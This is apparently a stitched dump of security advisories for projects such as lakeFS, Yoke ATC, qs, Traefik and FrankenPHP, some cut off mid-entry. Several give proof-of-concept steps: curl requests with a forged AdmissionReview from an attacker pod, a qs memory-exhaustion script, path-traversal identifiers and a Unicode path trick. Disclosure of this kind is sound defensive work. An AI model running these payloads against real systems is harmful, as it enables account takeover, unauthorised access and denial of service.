The application leaks the password reset token within a hidden HTML input field on the password reset page. This allows any unauthenticated attacker to retrieve the reset token for any user by simply querying the user's email, leading to full Account Takeover (ATO) without requiring access to the victim's email inbox.\n\n### Details\nThe vulnerability occurs within the password reset flow. When a reset is requested, the application generates a verification code. However, the subsequent reset page (/account/password/reset/) incorrectly reflects this code back to the client in the HTML source code.\n\nSpecifically, the sensitive token is embedded in:\n<input type=\"hidden\" name=\"code\" value=\"[SECRET_TOKEN]\">\n\nBecause this page is accessible via a GET request using the victim's email as a parameter, an attacker can programmatically extract the token.\n\n### PoC\n1. The attacker asks for a password reset for the victim\n\n<img width=\"1328\" height=\"580\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0197907e-f10b-4e6d-989e-f25c408862cd\" />\n\n<img width=\"1139\" height=\"452\" alt=\"image(1)\" src=\"https://github.com/user-attachments/assets/9a317b27-b56a-4663-9965-d3e660713f4e\" />\n\n\n2. The attacker makes the following curl command on the terminal using the victim's email, and is able to get the code that was sent as an hidden field in the HTML.\n<img width=\"917\" height=\"220\" alt=\"image(2)\" src=\"https://github.com/user-attachments/assets/af89ba3b-de56-4437-84b3-c1feb56d2348\" />\n\n3. With this code, the attacker is able to use it in order to reset the victim password.\n<img width=\"1335\" height=\"711\" alt=\"image(3)\" src=\"https://github.com/user-attachments/assets/498b8a2e-9eb2-4b50-bc35-26b0f2764c8d\" />\n\n<img width=\"1258\" height=\"524\" alt=\"image(4)\" src=\"https://github.com/user-attachments/assets/d1304dc3-bf56-4ec7-920c-ecce502db6b0\" />\n\n4. The attacker is able to login with the new password.\n\n<img width=\"1514\" height=\"631\" alt=\"image(5)\" src=\"https://github.com/user-attachments/assets/2533032e-6f0d-45c8-9fe1-881bfedebcc4\" />\n\n<img width=\"1528\" height=\"647\" alt=\"image(6)\" src=\"https://github.com/user-attachments/assets/a6e9144c-cc96-493d-8780-9156c299a192\" />\n\n\n\n### Impact\n- An attacker can compromise any account on the platform, including administrative accounts, resulting in total loss of Confidentiality, Integrity, and Availability.",

On vulnerable versions, this results in a Rust \"panic\" during key construction. Note that an attacker can trigger this situation even in places where applications don't expect to handle foreign key material, for example while attempting to receive a message.\n\nFor more information on the rsa crate vulnerability, see https://github.com/RustCrypto/RSA/security/advisories/GHSA-9c48-w39g-hm26 and https://github.com/RustCrypto/RSA/pull/624.\nIn rPGP, this has been fixed via https://github.com/rpgp/rpgp/pull/698.\n\n### Impact\nThis issue impacts availability (i.e. applications can crash).\n\nAffected rPGP versions: rPGP 0.16.0-alpha.0 to 0.18.0\nVulnerable rsa versions: all before version 0.9.10\n\n### Workaround\nThe issue depends on the combination of affected rPGP and rsa versions.

Prefix Bypass Vulnerability\n\nThe `verifyRelPath` function used `strings.HasPrefix()` to verify that requested paths fall within the configured storage directory. This check was insufficient because it validated only the path prefix without requiring a path separator, allowing access to sibling directories with similar names.\n\n**Example:** If the adapter is configured with base path `/data/lakefs`:\n\n| Path | Expected | Actual |\n|------|----------|--------|\n| `/data/lakefs/valid/file.txt` | Allowed | Allowed |\n| `/data/lakefs_evil/secret.txt` | Blocked | **Vulnerable** |\n| `/data/lakefs_backup/data.db` | Blocked | **Vulnerable** |\n\n### 2. Namespace Escape via Identifier\n\nThe adapter verified that resolved paths stayed within the adapter's base path, but did not verify that object identifiers stayed within their designated storage namespace. This allowed attackers to use path traversal sequences in the object identifier to access files in other namespaces.\n\n**Example:** With base path `/data/lakefs` and namespace `local://repo1/userdata`:\n\n| Identifier | Resolved Path | Expected | Actual |\n|------------|---------------|----------|--------|\n| `file.txt` | `/data/lakefs/repo1/userdata/file.txt` | Allowed | Allowed |\n| `../secrets/key.txt` | `/data/lakefs/repo1/secrets/key.txt` | Blocked | **Vulnerable** |\n| `../../other-repo/data.txt` | `/data/lakefs/other-repo/data.txt` | Blocked | **Vulnerable** |\n\nThis vulnerability allows users with access to one namespace to read and write files in other namespaces within the same lakeFS deployment.\n\n## Impact\n\nAuthenticated lakeFS users can:\n\n- **Read and write files in sibling directories** that share the same path prefix as the storage directory (vulnerability 1)\n- **Access files across namespaces** by using path traversal in object identifiers (vulnerability 2)\n\nThis could allow attackers to:\n\n- Read sensitive data from other repositories/namespaces\n- Write malicious files to other namespaces\n- Read/write files in adjacent directories outside lakeFS storage\n- Potentially escalate privileges if writable directories are used by other services\n\nThis vulnerability **only affects** deployments using the local block adapter. Deployments using S3, GCS, Azure, or other object storage backends are **not affected**.\n\n## Patches\n\nFixed in version v1.77.0.\n\nThe fixes:\n1. Append a path separator to prefix checks, ensuring paths must be within the storage directory\n2. Add two-level path validation: verify both that namespace paths stay within the adapter's base path AND that resolved paths stay within their designated namespace\n\n## Workarounds\n\n- Configure the storage path with a unique name unlikely to be a prefix of other directories\n- Restrict filesystem permissions for the lakeFS process\n- Ensure no sensitive data exists in sibling directories\n\n## Credit\n\nDiscovered via CodeQL static analysis.",

This may allow unauthorized access to registries or the NeuVector controller, potentially enabling image manipulation, information disclosure, or further lateral movement within the environment.\n\n**Important:**\n- For the exposure of credentials not related to Rancher NeuVector, the final impact severity for confidentiality, integrity and availability is dependent on the permissions the leaked credentials have on their services.\n- It is recommended to review for potentially leaked credentials in this scenario and to change them if deemed necessary.\n\nPlease consult the associated [MITRE ATT&CK – Technique – Credential Access and Unsecured Credentials](https://attack.mitre.org/techniques/T1552/) for further information about this category of attack.\n\n### Patches\nPatched versions include release `v4.072` and above.\n\nStarting from version `v4.072`, the scanner monitor process does not pass credentials to the scanner anymore. Instead, scanner process gets credentials information from environment variables, preventing them from being exposed through `/proc/*/cmdline`.\n\n### Workarounds\nThere is no workaround for this issue. Users are recommended to upgrade, as soon as possible, to a version of NeuVector scanner that contains the fix.\n\n### References\nIf you have any questions or comments about this advisory:\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [NeuVector](https://github.com/neuvector/neuvector/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-neuvector/support-matrix/all-supported-versions/neuvector-v-all-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/#suse-security).",

An attacker with the ability to manipulate database records (e.g., via SQL injection or compromised admin access) could inject malicious serialized objects containing arbitrary closures, leading to Remote Code Execution (RCE) when the magic link is visited.\n\n## Resolution\n\nThe vulnerability has been mitigated through HMAC-signed serialization using the application key, class allowlisting restricted to `ActionAbstract` subclasses and framework classes, strict type validation preventing arbitrary object storage, and backward compatibility support for legacy data via `allowed_classes` in `unserialize()`. Implementation includes a new [Serializable](src/Security/Serializable/Serializable.php) security class with signing/verification, refactored getter/setter methods in MagicLink.",

The SurrealDB instance terminates instantly, requiring a manual restart.\n\nThe query consists of using built-in string functions to construct a large string and passing it to the JavaScript runtime for compilation. The exact string size required to trigger the crash varies between SurrealDB versions.\n\nWhilst exploiting the vulnerability requires users to be able to run arbitrary queries, if guest access (`--allow-guests`), is enabled, then guests can perform this attack.\n\n### Impact\n\nAny user able to execute queries on a SurrealDB instance with scripting enabled (`--allow-scripting`) can cause complete denial of service. The server process terminates immediately without graceful shutdown.\n\nThe underlying cause of the vulnerability is a null pointer dereference in the `QuickJS-NG` v0.8 JavaScript engine, this vulnerability cannot be exploited to execute arbitrary code, or compromise the integrity or confidentiality of data. \n\n### Patches\n\nVersions prior to SurrealDB `v2.6.1` and `v3.0.0-beta.3` are vulnerable.\n\nThe patches for SurrealDB `v2.6.1` and `v3.0.0-beta.3` update the `rquickjs` dependency from `v0.9.0` to `v0.11.0`, which in turn uses an updated version of `QuickJS-NG`.\n\n### Workarounds\nDeny execution of embedded scripting functions through the configuration of [capabilities](https://surrealdb.com/docs/surrealdb/security/capabilities#capabilities) by starting SurrealDB with the `--deny-scripting` flag or the equivalent environment variable `SURREAL_CAPS_DENY_SCRIPT=true`. This has a usability implication, although scripting functions are disabled by default.\n\nAdministrators can also use `--deny-arbitrary-query`  to deny arbitrary querying by either `guest`, `record` or `system` users, or a combination of those, with impacts to functionality for those users. \n\n### Links ###\n[SurrealDB Documentation - Capabilities](https://surrealdb.com/docs/surrealdb/security/capabilities)\n[SurrealDB Documentation - Guest Access](https://surrealdb.com/docs/surrealdb/security/capabilities#guest-access)\n[SurrealQL Documentation - Scripting Functions](https://surrealdb.com/docs/surrealql/functions/script)\n[quickjs-ng v0.9 Release Notes](https://github.com/quickjs-ng/quickjs/releases/tag/v0.9.0)\nhttps://github.com/surrealdb/surrealdb/pull/6833\nhttps://github.com/surrealdb/surrealdb/pull/6774",

It allows users with CR create/update permissions to execute arbitrary WASM code in the ATC controller context by injecting a malicious URL through the `overrides.yoke.cd/flight` annotation. The ATC controller downloads and executes the WASM module without proper URL validation, enabling attackers to create arbitrary Kubernetes resources or potentially escalate privileges to cluster-admin level.\n\n**Recommended CWE**: CWE-94 (Improper Control of Generation of Code - Code Injection)\n\n## Summary\n\nYoke ATC allows users to override the Flight WASM module URL via the `overrides.yoke.cd/flight` annotation on Custom Resources. The controller only checks if the user has `update` permission on `airways` resources but does not validate the WASM URL source. An attacker with CR create/update permissions can inject a malicious WASM URL, causing the ATC controller to download and execute arbitrary code.\n\n## Details\n\nThe vulnerability exists in two code paths:\n\n**Source Point -

This proves arbitrary code execution in the ATC controller context.\n\n## Impact\n\n**Vulnerability Type**: Remote Code Execution (RCE) / Code Injection\n\n**Attack Prerequisites**:\n- Attacker has permission to create/update Custom Resources managed by Yoke ATC\n- Network access to host malicious WASM (can be external URL)\n\n**Impact Assessment**:\n- **Confidentiality**: High - Attacker can create resources to exfiltrate data; if ClusterAccess is enabled, can read cluster secrets via host functions\n- **Integrity**: High - Attacker can create/modify arbitrary Kubernetes resources through WASM output\n- **Availability**: Medium - Attacker can disrupt cluster operations by creating malicious resources\n\n**Attack Scenario**:\n1. CI/CD developer or application developer with CR permissions creates a Backend CR with malicious annotation\n2. ATC controller downloads and executes attacker-controlled WASM\n3. Malicious WASM creates backdoor resources or exfiltrates sensitive data\n4. If ClusterAccess is enabled, attacker can read secrets and escalate to cluster-admin\n\n## Severity\n\n**CVSS v3.1 Score**: 8.8 (High)\n\n**Vector**: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\n\n- Attack Vector (AV): Network - Malicious WASM can be hosted externally\n- Attack Complexity (AC): Low - Simple annotation injection\n- Privileges Required (PR): Low - Only CR create/update permission needed\n- User Interaction (UI): None - Automatic execution on CR creation\n- Scope (S): Unchanged - Impact within ATC controller context\n- Confidentiality (C): High - Can access controller context data\n- Integrity (I): High - Can create arbitrary resources\n- Availability (A): High - Can disrupt cluster operations\n\n## Affected Versions\n\n- Yoke ATC v0.18.x and earlier versions\n- All versions that support the `overrides.yoke.cd/flight` annotation\n\n## Patched Versions\n\nNo patch available at time of disclosure.\n\n## Workarounds\n\n1. **Disable annotation override feature**: Remove or disable the `overrides.yoke.cd/flight` annotation processing in production environments\n\n2. **Network policy**: Restrict ATC controller's outbound network access to prevent downloading external WASM modules\n\n3. **RBAC hardening**: Limit CR create/update permissions to trusted users only\n\n4. **Admission webhook**: Deploy a validating webhook to reject CRs with `overrides.yoke.cd/flight` annotations\n\n## References\n\n- Yoke Project: https://github.com/yokecd/yoke\n- Yoke ATC Documentation: https://yokecd.github.io/docs/airtrafficcontroller/atc/\n- CWE-94: Improper Control of Generation of Code: https://cwe.mitre.org/data/definitions/94.html\n\n## Credits\n\ncredit for:\n@b0b0haha (603571786@qq.com)\n@lixingquzhi (mayedoushidalao@163.com)",

The ATC webhook endpoints lack proper authentication mechanisms, allowing any pod within the cluster network to directly send AdmissionReview requests to the webhook, bypassing Kubernetes API Server authentication. This enables attackers to trigger WASM module execution in the ATC controller context without proper authorization.\n\n**Recommended CWE**: CWE-306 (Missing Authentication for Critical Function)\n\n## Summary\n\nYoke ATC implements multiple Admission Webhook endpoints (`/validations/{airway}`, `/validations/resources`, `/validations/flights.yoke.cd`, `/validations/airways.yoke.cd`, etc.) that process AdmissionReview requests. These endpoints do not implement TLS client certificate authentication or request source validation. Any client that can reach the ATC service within the cluster can send requests directly to these endpoints, bypassing the Kubernetes API Server's authentication and authorization mechanisms.\n\n## Details\n\nThe vulnerability exists in the HTTP handler implementation where webhook endpoints accept and process requests without verifying the client identity.\n\n**Vulnerable Endpoint Handlers** (`cmd/atc/handler.go:147-335`):\n```go\nmux.HandleFunc(\"POST /validations/{airway}\", func(w http.ResponseWriter, r *http.Request) {\n    var review admissionv1.AdmissionReview\n    if err := json.NewDecoder(r.Body).Decode(&review); err != nil {\n        http.Error(w, fmt.Sprintf(\"failed to decode review: %v\", err), http.StatusBadRequest)\n        return\n    }\n    // No authentication check - request is processed directly\n    // ...\n})\n```\n\n**Additional Unauthenticated Endpoints**:\n- `/validations/resources` (`cmd/atc/handler.go:337-538`)\n- `/validations/external-resources` (`cmd/atc/handler.go:540-597`)\n- `/validations/airways.yoke.cd` (`cmd/atc/handler.go:599-636`)\n- `/validations/flights.yoke.cd` (`cmd/atc/handler.go:638-733`)\n- `/crdconvert/{airway}` (`cmd/atc/handler.go:61-145`)\n\nThe code lacks:\n1. TLS client certificate verification\n2. Request source validation (verifying requests come from kube-apiserver)\n3. Any form of authentication middleware\n\n## PoC\n\n### Environment Setup\n\n**Prerequisites**:\n- Docker installed and running\n- kubectl installed\n- Go 1.21+ installed\n- kind installed\n\n**Step 1: Create Kind cluster**\n```bash\ncat > /tmp/kind-config.yaml << 'EOF'\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nname: yoke-vuln-test\nnodes:\n- role: control-plane\nEOF\n\nkind create cluster --config /tmp/kind-config.yaml\n```\n\n**Step 2: Build and install Yoke CLI**\n```bash\ngit clone https://github.com/yokecd/yoke.git\ncd yoke\nGOPROXY=direct GOSUMDB=off go build -o /tmp/yoke ./cmd/yoke\n```\n\n**Step 3: Deploy ATC**\n```bash\n/tmp/yoke takeoff --create-namespace --namespace atc -wait 120s atc oci://ghcr.io/yokecd/atc-installer:latest\n```\n\n**Step 4: Deploy Backend Airway example**\n```bash\n/tmp/yoke takeoff -wait 60s backendairway \"https://github.com/yokecd/examples/releases/download/latest/atc_backend_airway.wasm.gz\"\n```\n\n### Exploitation Steps\n\n**Step 1: Create attacker pod**\n```bash\nkubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata:\n  name: webhook-attacker\n  namespace: default\nspec:\n  containers:\n  - name: attacker\n    image: curlimages/curl:latest\n    command: [\"sleep\", \"infinity\"]\nEOF\n\nkubectl wait --for=condition=Ready pod/webhook-attacker --timeout=60s\n```\n\n**Step 2: Probe webhook endpoints from attacker pod**\n```bash\nkubectl exec webhook-attacker -- curl -k -s -w \"\\nHTTP_CODE: %{http_code}\" \\\n  -X POST https://atc-atc.atc.svc.cluster.local:80/validations/resources \\\n  -H \"Content-Type: application/json\" -d '{}'\n```\n\nActual output from verification:\n```\npanic\n\nHTTP_CODE: 500\n```\n\nThe HTTP 500 response (not 401/403) indicates the endpoint is accessible without authentication. The error is due to invalid request body format, not authentication failure.\n\n**Step 3: Send crafted AdmissionReview request**\n\nCreate malicious request file:\n```bash\ncat > /tmp/malicious-review.json << 'EOF'\n{\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"kind\": \"AdmissionReview\",\n  \"request\": {\n    \"uid\": \"vul002-exploit-uid\",\n    \"kind\": {\"group\": \"examples.com\", \"version\": \"v1\", \"kind\": \"Backend\"},\n    \"resource\": {\"group\": \"examples.com\", \"version\": \"v1\", \"resource\": \"backends\"},\n    \"name\": \"exploit-backend\",\n    \"namespace\": \"default\",\n    \"operation\": \"CREATE\",\n    \"userInfo\": {\"username\": \"attacker-from-pod\", \"groups\": [\"system:unauthenticated\"]},\n    \"object\": {\n      \"apiVersion\": \"examples.com/v1\",\n      \"kind\": \"Backend\",\n      \"metadata\": {\"name\": \"exploit-backend\", \"namespace\": \"default\"},\n      \"spec\": {\"image\": \"nginx:latest\", \"replicas\": 1}\n    }\n  }\n}\nEOF\n\nkubectl cp /tmp/malicious-review.json webhook-attacker:/tmp/malicious-review.json\n```\n\nSend the request:\n```bash\nkubectl exec webhook-attacker -- curl -k -s -X POST \\\n  https://atc-atc.atc.svc.cluster.local:80/validations/backends.examples.com \\\n  -H \"Content-Type: application/json\" \\\n  -d @/tmp/malicious-review.json\n```\n\nActual output from verification:\n```json\n{\"kind\":\"AdmissionReview\",\"apiVersion\":\"admission.k8s.io/v1\",\"request\":{\"uid\":\"vul002-normal-test\",\"kind\":{\"group\":\"examples.com\",\"version\":\"v1\",\"kind\":\"Backend\"},\"resource\":{\"group\":\"examples.com\",\"version\":\"v1\",\"resource\":\"backends\"},\"name\":\"vul002-normal-backend\",\"namespace\":\"default\",\"operation\":\"CREATE\",\"userInfo\":{\"username\":\"attacker-from-pod\",\"groups\":[\"system:unauthenticated\"]},\"object\":{\"apiVersion\":\"examples.com/v1\",\"kind\":\"Backend\",\"metadata\":{\"name\":\"vul002-normal-backend\",\"namespace\":\"default\"},\"spec\":{\"image\":\"nginx:latest\",\"replicas\":1}},\"oldObject\":null,\"options\":null},\"response\":{\"uid\":\"vul002-normal-test\",\"allowed\":false,\"status\":{\"metadata\":{},\"status\":\"Failure\",\"message\":\"applying resource returned errors during dry-run...\"}}}\n```\n\n**Step 4: Verify ATC logs**\n```bash\nkubectl logs -n atc deployment/atc-atc --tail=20 | grep backends.examples.com\n```\n\nActual log output:\n```json\n{\"time\":\"2026-02-01T15:29:08.890991543Z\",\"level\":\"INFO\",\"msg\":\"request served\",\"component\":\"server\",\"code\":200,\"method\":\"POST\",\"path\":\"/validations/backends.examples.com\",\"elapsed\":\"435ms\",\"validation\":{\"allowed\":false,\"status\":\"Invalid\"}}\n```\n\nThe `elapsed: 435ms` indicates WASM module execution occurred.\n\n### Expected Result\n\nThe attacker pod successfully sends AdmissionReview requests directly to the ATC webhook endpoint without any authentication. The ATC controller processes the request and executes the WASM module, proving that:\n1. No TLS client certificate is required\n2. No request source validation occurs\n3. The fake `userInfo` is accepted without verification\n4. WASM modules are executed based on unauthenticated requests\n\n## Impact\n\n**Vulnerability Type**: Missing Authentication / Authentication Bypass\n\n**Attack Prerequisites**:\n- Attacker has access to a pod within the cluster network\n- Network policies do not restrict access to the ATC service (common in default configurations)\n\n**Impact Assessment**:\n- **Confidentiality**: Medium - Attacker can trigger WASM execution which may access controller context data\n- **Integrity**: High - Combined with VUL-001, attacker can create arbitrary Kubernetes resources\n- **Availability**: Medium - Attacker can cause resource exhaustion through repeated requests\n\n**Attack Scenario**:\n1. Attacker compromises a pod or gains access to the cluster network\n2. Attacker sends crafted AdmissionReview requests directly to ATC webhook\n3. ATC processes requests without verifying they came from the API Server\n4. Combined with annotation injection (VUL-001), attacker can execute arbitrary WASM code\n5. Malicious WASM can create resources or exfiltrate data using ATC's cluster-admin privileges\n\n## Severity\n\n**CVSS v3.1 Score**: 7.5 (High)\n\n**Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\n\n- Attack Vector (AV): Network - Accessible from cluster network\n- Attack Complexity (AC): Low - Simple HTTP request\n- Privileges Required (PR): None - No authentication required\n- User Interaction (UI): None - Automatic processing\n- Scope (S): Unchanged\n- Confidentiality (C): None - Direct impact limited\n- Integrity (I): High - Can trigger unauthorized WASM execution\n- Availability (A): None - No direct availability impact\n\nNote: When combined with VUL-001, the overall impact increases significantly.\n\n## Affected Versions\n\n- Yoke ATC v0.18.x and earlier versions\n- All versions that implement Admission Webhook endpoints without client authentication\n\n## Patched Versions\n\nNo patch available at time of disclosure.\n\n## Workarounds\n\n1. **Network Policy**: Deploy NetworkPolicy to restrict access to ATC service, allowing only kube-apiserver to connect\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: atc-webhook-policy\n  namespace: atc\nspec:\n  podSelector:\n    matchLabels:\n      yoke.cd/app: atc\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          kubernetes.io/metadata.name: kube-system\n      podSelector:\n        matchLabels:\n          component: kube-apiserver\n```\n\n2. **Service Mesh**: Use a service mesh (Istio, Linkerd) to enforce mTLS between services\n\n3. **Pod Security**: Implement strict pod security policies to limit which pods can be created in the cluster\n\n## References\n\n- Yoke Project: https://github.com/yokecd/yoke\n- Kubernetes Admission Webhooks: https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/\n- CWE-306: Missing Authentication for Critical Function: https://cwe.mitre.org/data/definitions/306.html\n\n## Credits\ncredit for:\n@b0b0haha (603571786@qq.com)\n@lixingquzhi (mayedoushidalao@163.com)",

          "html": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.\n\n**Current code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\n\n**Fixed code:**\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    const splitArray = val.split(',');\n    if (splitArray.length > options.arrayLimit - currentArrayLength) {  // Check against remaining limit\n        if (options.throwOnLimitExceeded) {\n            throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n        } else {\n            // Optionally convert to object or truncate, per README\n            return splitArray.slice(0, options.arrayLimit - currentArrayLength);\n        }\n    }\n    return splitArray;\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThis aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`.

          "html": "## Impact\n\nThere is a potential vulnerability in Traefik managing STARTTLS requests. \n\nAn unauthenticated client can bypass Traefik entrypoint `respondingTimeouts.readTimeout` by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely, leading to a denial of service. \n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v3.6.8\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nA remote, unauthenticated client can bypass Traefik entrypoint `respondingTimeouts.readTimeout` by sending the 8-byte Postgres SSLRequest (STARTTLS) prelude and then stalling, causing connections to remain open indefinitely and enabling file-descriptor and goroutine exhaustion denial of service.\n\nThis triggers during protocol detection **before routing**, so it is reachable on an entrypoint even when **no Postgres/TCP routers are configured** (the PoC uses only an HTTP router).\n\n### Details\nTraefik applies per-connection deadlines based on `entryPoints.<name>.transport.respondingTimeouts.readTimeout` to prevent protocol detection and request reads from blocking forever (see `pkg/server/server_entrypoint_tcp.go`, which sets `SetReadDeadline` on accepted connections).\n\nHowever, in the TCP router protocol detection path (`pkg/server/router/tcp/router.go`), when Traefik detects the Postgres STARTTLS signature on a new connection, it executes a fast-path that clears deadlines:\n\n- detect Postgres SSLRequest (8-byte signature),\n- call `conn.SetDeadline(time.Time{})` (clears all deadlines),\n- then enter the Postgres STARTTLS handler (`servePostgres`).\n\nThe Postgres handler (`pkg/server/router/tcp/postgres.go`) then blocks waiting for a TLS ClientHello via the same peeking logic used elsewhere (`clientHelloInfo(br)`), but with deadlines removed. An attacker can therefore:\n\n1. connect to any internet-exposed TCP entrypoint,\n2. send the Postgres SSLRequest (SSL negotiation request),\n3. receive Traefik’s single-byte response (`S`),\n4. stop sending any further bytes.\n\n\nEach such connection remains open past the configured `readTimeout` (indefinitely), consuming a goroutine and a file descriptor until Traefik hits process limits.\n\n_Of note_: CVE-2026-22045 fixed a conceptually-similar DoS where a protocol-specific fast path cleared connection deadlines and then could block in TLS handshake processing, allowing unauthenticated clients to tie up goroutines/FDs indefinitely. This report is the same failure mode, but triggered via the Postgres STARTTLS detection path.\n\nTested versions:\n- `v3.6.7`\n- `master` at commit `a4a91344edcdd6276c1b766ca19ee3f0e346480f` \n\n### PoC\nPrerequisites:\n- Linux host\n- Python 3\n- A prebuilt Traefik `v3.6.7` binary.

          "html": "### Summary\n\nFrankenPHP’s CGI path splitting logic improperly handles Unicode characters during case conversion. The logic computes the split index (for finding `.php`) on a lowercased copy of the request path but applies that byte index to the original path.\n\nBecause `strings.ToLower()` in Go can increase the byte length of certain UTF-8 characters (e.g., `Ⱥ` expands when lowercased), the computed index may not align with the correct position in the original string. This results in an incorrect `SCRIPT_NAME` and `SCRIPT_FILENAME`, potentially causing FrankenPHP to execute a file other than the one intended by the URI.\n\n### **Details**\n\nThe vulnerability resides in the `splitPos()` function and its usage within `splitCgiPath()`. The logic attempts to find the script extension (e.g., `.php`) in a case-insensitive manner by lowercasing the path:\n\n```go\nlowerPath := strings.ToLower(path)\nidx := strings.Index(lowerPath, strings.ToLower(split))\nreturn idx + len(split)\n```\n\nThe issue is that the returned `idx` represents a byte offset within `lowerPath`. However, `splitCgiPath()` uses this index to slice the **original** `path`:\n\n```go\nfc.docURI = path[:splitPos]\nfc.pathInfo = path[splitPos:]\nfc.scriptName = strings.TrimSuffix(path, fc.pathInfo)\nfc.scriptFilename = sanitizedPathJoin(fc.documentRoot, fc.scriptName)\n```\n\nThis logic relies on the assumption that `len(strings.ToLower(path)) == len(path)`. This assumption is false for certain Unicode characters. For example, the character `Ⱥ` (U+023A) requires 2 bytes in UTF-8 (`0xC8 0xBA`), but its lowercase equivalent `ⱥ` (U+2C65) requires 3 bytes (`0xE2 0xB1 0xA5`).\n\nIf the path contains such characters before the `.php` extension, the index calculated on `lowerPath` will be larger than the corresponding visual point in the original `path`. When applied to the original path, the split occurs at the wrong byte offset. This can cause the server to treat a larger portion of the path as the script name, effectively allowing an attacker to manipulate `SCRIPT_FILENAME`.\n\n### **PoC**\n\nThe following Go program demonstrates the discrepancy between the byte index in the lowercased string versus the original string.\n\n1. Save the following as `poc.go`:\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc splitPos(path string, split string) int {\n    lowerPath := strings.ToLower(path)\n    idx := strings.Index(lowerPath, strings.ToLower(split))\n    if idx < 0 {\n        return -1\n    }\n    return idx + len(split)\n}\n\nfunc main() {\n    // U+023A: Ⱥ (UTF-8: C8 BA). Lowercase is ⱥ (UTF-8: E2 B1 A5), longer in bytes.\n    // We construct a path where the byte expansion shifts the index.\n    path := \"/ȺȺȺȺshell.php.txt.php\"\n    split := \".php\"\n\n    pos := splitPos(path, split)\n\n    fmt.Printf(\"orig bytes=%d\\n\", len(path))\n    fmt.Printf(\"lower bytes=%d\\n\", len(strings.ToLower(path)))\n    fmt.Printf(\"splitPos=%d\\n\", pos)\n\n    // Current Unsafe Behavior:\n    fmt.Printf(\"orig[:pos] (Calculated Script)=%q\\n\", path[:pos])\n    fmt.Printf(\"orig[pos:] (Calculated PathInfo)=%q\\n\", path[pos:])\n\n    // Expected Safe Behavior:\n    want := strings.Index(path, split) + len(split)\n    fmt.Printf(\"expected splitPos=%d\\n\", want)\n    fmt.Printf(\"expected orig[:]=%q\\n\", path[:want])\n}\n```\n\n2. Run the PoC:\n\n```console\ngo run poc.go\n```\n\n3. 